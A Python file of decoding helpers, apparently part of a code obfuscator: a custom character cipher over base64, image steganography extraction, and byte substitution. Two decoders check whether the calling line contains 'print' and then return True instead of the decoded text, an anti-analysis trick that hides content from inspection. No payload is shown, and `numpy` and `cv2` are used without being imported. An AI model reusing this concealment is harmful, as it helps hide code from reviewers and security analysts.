import os,base64,sys,inspect
os.dont_write_bytecode = True
def thiss(devf=''):
    sys.stdout = sys.__stdout__
lower_en1={'a':'Lw','b':'MJ','c':'HO','d':'DY','e':'rU','f':'cF','g':'Xp','h':'Ez','i':'gM','j':'Aq','k':'ev','l':'WB','m':'as','n':'XK','o':'Di','p':'PV','q':'tj','r':'kW','s':'uw','t':'EQ','u':'nu','v':'Uu','w':'Nc','x':'PH','y':'xM','z':'hw'}
upper_en2={'A':'jH','B':'Oy','C':'dN','D':'La','E':'rO','F':'Fw','G':'hR','H':'qH','I':'tD','J':'uV','K':'mn','L':'Dn','M':'jf','N':'Wt','O':'nJ','P':'eY','Q':'vr','R':'cP','S':'hZ','T':'Pp','U':'Ui','V':'IF','W':'mB','X':'eZ','Y':'XM','Z':'vO'}
numbers_en3={'0':'sJ','1':'NE','2':'ah','3':'hD','4':'yL','5':'GW','6':'GF','7':'uC','8':'TS','9':'CA'}
symbol_en4={'!':'WN','"':'Id','#':'Js','$':'MY','%':'mV','&':'Gh',"'":'nU','(':'me',')':'xV','*':'ET','+':'wi',',':'NQ','-':'vM','.':'Pz','/':'GA',':':'er',';':'uO','<':'hg','=':'DF','>':'iL','?':'oc','@':'vi','[':'kx','\\':'Xw',']':'sK','^':'sR','_':'xN','`':'yl','{':'jc','|':'iW','}':'zh','~':'oS'}
extras_en5={' ':'Jk','\n':'hs','\t':'Mn','\r':'KH'}
lower_rev = {v: k for k, v in lower_en1.items()}
upper_rev = {v: k for k, v in upper_en2.items()}
numbers_rev = {v: k for k, v in numbers_en3.items()}
symbol_rev = {v: k for k, v in symbol_en4.items()}
extras_rev = {v: k for k, v in extras_en5.items()}
def encc(word):
    global lower_en1, upper_en2, numbers_en3, symbol_en4, extras_en5
    def mrg(*args):
      final_enc5 = dict()
      for x in args:
        final_enc5.update(x)
      return final_enc5
    final_enc5 = mrg(lower_en1,upper_en2,numbers_en3,symbol_en4,extras_en5)
    wrd = []
    for x in word:
        wrd.append(final_enc5[x])
    return ''.join(n for n in wrd)
try:
    def messageToBinary(message):
      if type(message) == str:
        return ''.join([ format(ord(i), "08b") for i in message ])
      elif type(message) == bytes or type(message) == np.ndarray:
        return [ format(i, "08b") for i in message ]
      elif type(message) == int or type(message) == np.uint8:
        return format(message, "08b")
      else:
        raise TypeError("Input type not supported")
    def showData(image):
      binary_data = ""
      for values in image:
          for pixel in values:
              r, g, b = messageToBinary(pixel)
              binary_data += r[-1]
              binary_data += g[-1]
              binary_data += b[-1]
      all_bytes = [ binary_data[i: i+8] for i in range(0, len(binary_data), 8) ]
      decoded_data = ""
      for byte in all_bytes:
          decoded_data += chr(int(byte, 2))
          if decoded_data[-37:] == "tTn!rqXDjU]:/p=RHWLVGg0V}1{@7p}w#####":
              break
      return decoded_data[:-37]
    def decode_text(image_name):
      image = cv2.imread(image_name)
      text = showData(image)
      return str(text)
except:
    print('[-] Something went wrong')
def sydeco(dats):
    try:
        global lower_rev, upper_rev, numbers_rev, symbol_rev, extras_rev
        def mrg_rev(*args):
            final_enc5 = dict()
            for x in args:
                final_enc5.update(x)
            return final_enc5
        final_rev = mrg_rev(lower_rev,upper_rev,numbers_rev,symbol_rev,extras_rev)
        dats_r = base64.b64decode(dats)
        token = [c+' ' if not v%2==0 else c for v,c in enumerate(dats_r)]
        token = ''.join(z for z in token)[:-1].split(' ')
        tokens = []
        for tkn in token:
            tokens.append(final_rev[tkn])
        if not 'print' in inspect.stack()[len(inspect.stack())-1][4][0]:
            return ''.join(data for data in tokens)
        elif 'print' in inspect.stack()[len(inspect.stack())-1][4][0]:
            return True
    except Exception:
        print('Something went wrong')
def hexing(data):
    try:
        data = str(data)
        if not 'print' in inspect.stack()[len(inspect.stack())-1][4][0]:
            return data.replace('\x90','\x74').replace('\x53','\x72').replace('\x12','\x65').replace('\xc7','\x0a').replace('\xcc','\x20').replace('\x97','\x28').replace('\x01','\x78').replace('\x54','\x6e').replace('\x92','\x69').replace('\xc9','\x70').replace('\x7c','\x4a').replace('\xc2','\x41').replace('\xd6','\x6f').replace('\xd7','\x61').replace('\xf9','\x55').replace('\xa9','\x41').replace('\xe1','\x63').replace('\xe8','\x43').replace('\xde','\x73').replace('\xd0','\x79').replace('\xd8','\x33').replace('\x21','\x36').replace('\xce','\x31').replace('\x40','\x37')
        elif 'print' in inspect.stack()[len(inspect.stack())-1][4][0]:
            return True
    except Exception:
        print('Something went wrong')
